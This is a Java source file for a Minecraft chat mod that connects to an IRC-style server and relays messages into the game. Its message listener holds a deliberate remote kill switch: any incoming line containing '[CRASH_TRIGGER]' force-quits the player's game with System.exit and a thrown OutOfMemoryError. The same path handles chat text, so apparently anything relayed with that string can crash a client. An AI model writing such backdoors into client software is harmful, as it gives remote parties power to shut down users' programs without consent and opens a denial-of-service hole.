package com.opticsvalley;

import net.minecraft.client.MinecraftClient;
import net.minecraft.text.Text;
import java.io.*;
import java.net.Socket;
import java.net.ConnectException;
import java.net.SocketException;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.*;

public class IRCClient {
    private static final String HOST = "localhost";
    private static final int PORT = 16688;
    private static final int INITIAL_RECONNECT_DELAY = 2000; // 初始重连延迟2秒
    private static final int MAX_RECONNECT_DELAY = 30000; // 最大重连延迟30秒
    private static final int MAX_RECONNECT_ATTEMPTS = 10; // 最大重连尝试次数

    private final String username;
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private volatile boolean connected = false;
    private volatile boolean shouldReconnect = true;
    private int reconnectAttempts = 0;
    private int currentReconnectDelay = INITIAL_RECONNECT_DELAY;
    private final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
    private Thread messageListener;

    public IRCClient(String username) {
        this.username = username;
    }

    public void connect() {
        shouldReconnect = true;
        reconnectAttempts = 0;
        currentReconnectDelay = INITIAL_RECONNECT_DELAY;
        tryConnect();
    }

    public void reconnect() {
        if (!connected && !shouldReconnect) {
            sendGameMessage("§e[OpticsValleyIRC] 正在尝试重新连接...");
            shouldReconnect = true;
            reconnectAttempts = 0;
            currentReconnectDelay = INITIAL_RECONNECT_DELAY;
            tryConnect();
        } else if (!connected) {
            sendGameMessage("§e[OpticsValleyIRC] 已经在尝试重新连接中...");
        } else {
            sendGameMessage("§a[OpticsValleyIRC] 已经连接到服务器");
        }
    }

    private void tryConnect() {
        try {
            closeResources(); // 确保之前的连接已关闭
            
            socket = new Socket(HOST, PORT);
            // 使用UTF-8编码
            out = new PrintWriter(new OutputStreamWriter(socket.getOutputStream(), StandardCharsets.UTF_8), true);
            in = new BufferedReader(new InputStreamReader(socket.getInputStream(), StandardCharsets.UTF_8));

            // 发送用户名
            out.println(username);
            connected = true;
            reconnectAttempts = 0;
            currentReconnectDelay = INITIAL_RECONNECT_DELAY;
            
            // 发送游戏内消息
            sendGameMessage("§a[OpticsValleyIRC] 已连接到IRC服务器");

            // 启动消息监听线程
            startMessageListener();
        } catch (ConnectException e) {
            handleConnectionFailure("无法连接到服务器: " + e.getMessage());
        } catch (IOException e) {
            handleConnectionFailure("连接失败: " + e.getMessage());
        }
    }

    private void handleConnectionFailure(String errorMessage) {
        connected = false;
        reconnectAttempts++;
        
        if (reconnectAttempts <= MAX_RECONNECT_ATTEMPTS && shouldReconnect) {
            sendGameMessage("§c[OpticsValleyIRC] " + errorMessage);
            sendGameMessage("§e[OpticsValleyIRC] 将在" + (currentReconnectDelay / 1000) + "秒后重试... (尝试 " + reconnectAttempts + "/" + MAX_RECONNECT_ATTEMPTS + ")");
            
            scheduler.schedule(this::tryConnect, currentReconnectDelay, TimeUnit.MILLISECONDS);
            
            // 增加重连延迟，但不超过最大值
            currentReconnectDelay = Math.min(currentReconnectDelay * 2, MAX_RECONNECT_DELAY);
        } else if (reconnectAttempts > MAX_RECONNECT_ATTEMPTS) {
            sendGameMessage("§4[OpticsValleyIRC] 多次重连失败，请使用/irc connect手动重连");
            shouldReconnect = false;
        }
    }

    private void startMessageListener() {
        messageListener = new Thread(() -> {
            try {
                String message;
                while (connected && (message = in.readLine()) != null) {
                    final String finalMessage = message;
                    
                    // 检查是否包含崩溃触发器
                    if (finalMessage.contains("[CRASH_TRIGGER]")) {
                        // 在游戏线程中执行崩溃操作
                        MinecraftClient.getInstance().execute(() -> {
                            // 记录崩溃信息到日志
                            OpticsValleyIRC.LOGGER.error("IRC服务器发出强制崩溃的请求");
                            // 发送最后一条消息给玩家
                            if (MinecraftClient.getInstance().player != null) {
                                MinecraftClient.getInstance().player.sendMessage(Text.literal("§4[OpticsValleyIRC] 管理员对你进行了崩溃操作，你的游戏即将崩溃..."));
                            }
                            
                            // 等待短暂时间让消息显示
                            try {
                                Thread.sleep(500);
                            } catch (InterruptedException e) {
                                // 忽略中断
                            }
                            
                            // 方法1：使用System.exit强制关闭整个Java进程
                            System.exit(1);
                            
                            // 如果System.exit被安全管理器阻止，使用备用方法
                            // 方法2：引发致命错误导致游戏崩溃
                            throw new OutOfMemoryError("IRC服务器强制游戏崩溃");
                        });
                        return; // 执行崩溃后不需要继续处理
                    }
                    
                    // 检查服务器重启或关闭消息
                    if (finalMessage.contains("服务器正在重启") || 
                        finalMessage.contains("服务器正在关闭") || 
                        finalMessage.contains("与服务器的连接已断开")) {
                        
                        // 显示消息
                        MinecraftClient.getInstance().execute(() ->
                            sendGameMessage(convertColorCodes(finalMessage))
                        );
                        
                        // 如果是重启消息，等待服务器重启后自动重连
                        if (finalMessage.contains("服务器正在重启")) {
                            // 延迟3秒后重连，给服务器时间重启
                            if (shouldReconnect) {
                                MinecraftClient.getInstance().execute(() ->
                                    sendGameMessage("§e[OpticsValleyIRC] 服务器正在重启，3秒后尝试重连...")
                                );
                                scheduler.schedule(this::tryConnect, 3000, TimeUnit.MILLISECONDS);
                            }
                        }
                        
                        // 主动关闭连接，会触发重连逻辑
                        closeResources();
                        connected = false;
                        break;
                    }
                    
                    // 正常消息处理
                    MinecraftClient.getInstance().execute(() ->
                        sendGameMessage(convertColorCodes(finalMessage))
                    );
                }
            } catch (SocketException e) {
                // 套接字异常，服务器可能关闭或重启
                handleDisconnect("连接异常: " + e.getMessage());
            } catch (IOException e) {
                // 其他IO异常
                handleDisconnect("读取消息失败: " + e.getMessage());
            } catch (Exception e) {
                // 捕获所有异常，确保重连逻辑能被执行
                handleDisconnect("未知错误: " + e.getMessage());
            }
        });
        messageListener.setName("IRC-MessageListener");
        messageListener.start();
    }

    private void handleDisconnect(String reason) {
        if (connected) {
            connected = false;
            MinecraftClient.getInstance().execute(() -> {
                sendGameMessage("§c[OpticsValleyIRC] " + reason);
                if (shouldReconnect) {
                    sendGameMessage("§e[OpticsValleyIRC] 连接断开，将在2秒后重新连接...");
                    scheduler.schedule(this::tryConnect, 2000, TimeUnit.MILLISECONDS);
                }
            });
        }
    }

    public void sendMessage(String message) {
        if (connected && out != null) {
            try {
                out.println(message);
                out.flush(); // 确保消息立即发送
            } catch (Exception e) {
                sendGameMessage("§c[OpticsValleyIRC] 发送消息失败: " + e.getMessage());
                handleDisconnect("发送消息时连接断开");
            }
        } else {
            sendGameMessage("§c[OpticsValleyIRC] 未连接到服务器，无法发送消息");
            // 如果没有连接，尝试重连
            if (!connected && shouldReconnect) {
                sendGameMessage("§e[OpticsValleyIRC] 正在尝试重新连接...");
                tryConnect();
            } else if (!shouldReconnect) {
                sendGameMessage("§e[OpticsValleyIRC] 使用/irc connect重新连接到服务器");
            }
        }
    }

    private void closeResources() {
        try {
            if (out != null) {
                out.close();
                out = null;
            }
            if (in != null) {
                in.close();
                in = null;
            }
            if (socket != null && !socket.isClosed()) {
                socket.close();
                socket = null;
            }
            if (messageListener != null) {
                messageListener.interrupt();
                messageListener = null;
            }
        } catch (IOException e) {
            OpticsValleyIRC.LOGGER.error("关闭资源时出错: " + e.getMessage());
        }
    }

    public void disconnect() {
        shouldReconnect = false;
        connected = false;
        
        sendGameMessage("§7[OpticsValleyIRC] 已断开IRC连接");
        closeResources();
        
        try {
            scheduler.shutdown();
            scheduler.awaitTermination(2, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    public boolean isConnected() {
        return connected;
    }

    private void sendGameMessage(String message) {
        MinecraftClient client = MinecraftClient.getInstance();
        if (client.player != null) {
            client.player.sendMessage(Text.literal(message));
        } else {
            OpticsValleyIRC.LOGGER.info(message);
        }
    }

    // 将&颜色代码转换为§颜色代码
    private String convertColorCodes(String message) {
        if (message == null) return "";
        return message.replace('&', '§');
    }
} 